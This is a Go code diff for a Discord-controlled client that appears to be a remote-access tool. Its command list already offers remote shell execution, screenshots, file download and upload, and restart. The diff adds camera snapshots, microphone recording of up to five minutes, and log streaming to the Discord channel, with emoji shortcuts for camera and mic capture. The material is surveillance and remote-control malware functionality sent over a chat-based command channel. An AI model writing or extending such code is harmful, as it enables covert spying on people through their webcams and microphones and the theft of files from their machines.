@@ -3,6 +3,7 @@ package main
 import (
 	"fmt"
 	"io"
+	"log"
 	"net/http"
 	"os"
 	"path/filepath"
@@ -27,6 +28,9 @@ func handleInteraction(s *discordgo.Session, i *discordgo.InteractionCreate) {
 				"**Slash commands**\n" +
 				"/cmd `<command>`          – run shell command\n" +
 				"/screenshot              – capture screenshots of all displays\n" +
+				"/camera                  – capture a snapshot from the default camera\n" +
+				"/mic `[duration]` `[path]` – record from microphone (seconds, optional path)\n" +
+				"/log `<on|off>`          – stream or stop logs into this channel\n" +
 				"/cwd                     – show current working directory\n" +
 				"/ls `[path]`              – list directory (current or given path)\n" +
 				"/download `<src>` `[dst]` – download file (src path, optional label)\n" +
@@ -34,6 +38,8 @@ func handleInteraction(s *discordgo.Session, i *discordgo.InteractionCreate) {
 				"/restart                 – restart this client process\n\n" +
 				"**Emoji commands**\n" +
 				"📸                        – capture screenshots of all displays\n" +
+				"📷                        – capture a snapshot from the default camera\n" +
+				"🎙                        – record 10 seconds from microphone\n" +
 				"👇 `<path>`                – download file from this machine (size < 8 MB)\n" +
 				"☝️ `<path>` *attach         – upload attached file to this path\n" +
 				"🔁                        – restart this client\n" +
@@ -87,6 +93,84 @@ func handleInteraction(s *discordgo.Session, i *discordgo.InteractionCreate) {
 				},
 			})
 			handleScreenshot(s, i.ChannelID, nil)
+		case "camera":
+			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
+				Type: discordgo.InteractionResponseChannelMessageWithSource,
+				Data: &discordgo.InteractionResponseData{
+					Content: "📷 Capturing camera snapshot...",
+					Flags:   discordgo.MessageFlagsEphemeral,
+				},
+			})
+			handleCameraSnapshot(s, i.ChannelID, nil)
+		case "mic":
+			var seconds int64 = 10
+			var path string
+			log.Printf("MIC slash command invoked: channel=%s user=%s", i.ChannelID, i.Member.User.ID)
+			for _, opt := range data.Options {
+				if opt.Name == "duration" {
+					seconds = opt.IntValue()
+				}
+				if opt.Name == "path" {
+					path = opt.StringValue()
+				}
+			}
+			log.Printf("MIC options: seconds=%d path=%s", seconds, path)
+			if seconds <= 0 {
+				seconds = 10
+			}
+			if seconds > 300 {
+				seconds = 300
+			}
+			if strings.HasPrefix(path, "~/") {
+				if home, err := os.UserHomeDir(); err == nil {
+					path = home + string(os.PathSeparator) + path[2:]
+				}
+			}
+			log.Printf("MIC normalized: seconds=%d resolvedPath=%s", seconds, path)
+			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
+				Type: discordgo.InteractionResponseChannelMessageWithSource,
+				Data: &discordgo.InteractionResponseData{
+					Content: fmt.Sprintf("🎙 Recording %d seconds from microphone...", seconds),
+					Flags:   discordgo.MessageFlagsEphemeral,
+				},
+			})
+			log.Printf("MIC starting handleMicRecord: channel=%s", i.ChannelID)
+			handleMicRecord(s, i.ChannelID, nil, int(seconds), path)
+			log.Printf("MIC handleMicRecord returned: channel=%s", i.ChannelID)
+		case "log":
+			var mode string
+			for _, opt := range data.Options {
+				if opt.Name == "mode" {
+					mode = strings.ToLower(opt.StringValue())
+					break
+				}
+			}
+			if mode != "on" && mode != "off" {
+				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
+					Type: discordgo.InteractionResponseChannelMessageWithSource,
+					Data: &discordgo.InteractionResponseData{
+						Content: "Mode must be `on` or `off`.",
+						Flags:   discordgo.MessageFlagsEphemeral,
+					},
+				})
+				return
+			}
+			if mode == "on" {
+				enableLogStreaming(s, i.ChannelID)
+			} else {
+				disableLogStreaming()
+			}
+			resp := "Log streaming disabled for this channel."
+			if mode == "on" {
+				resp = "Log streaming enabled for this channel."
+			}
+			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
+				Type: discordgo.InteractionResponseChannelMessageWithSource,
+				Data: &discordgo.InteractionResponseData{
+					Content: resp,
+					Flags:   discordgo.MessageFlagsEphemeral,
+				},
+			})
 		case "cwd":
 			cmd := "pwd"
 			if runtime.GOOS == "windows" {
